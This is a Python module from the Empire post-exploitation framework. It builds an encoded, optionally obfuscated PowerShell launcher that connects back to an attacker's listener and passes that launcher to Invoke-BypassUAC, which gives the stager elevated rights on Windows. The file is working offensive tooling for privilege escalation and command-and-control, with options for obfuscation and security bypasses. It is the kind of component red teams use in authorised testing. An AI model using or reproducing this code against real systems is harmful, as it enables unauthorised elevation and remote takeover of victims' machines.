from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        listener_name = params["Listener"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagers.generate_launcher(
            listenerName=listener_name,
            language="powershell",
            encode=True,
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            userAgent=user_agent,
            proxy=proxy,
            proxyCreds=proxy_creds,
            bypasses=params["Bypasses"],
        )

        if launcher == "":
            return handle_error_message("[!] Error in launcher generation.")
        script_end = f'Invoke-BypassUAC -Command "{launcher}"'

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
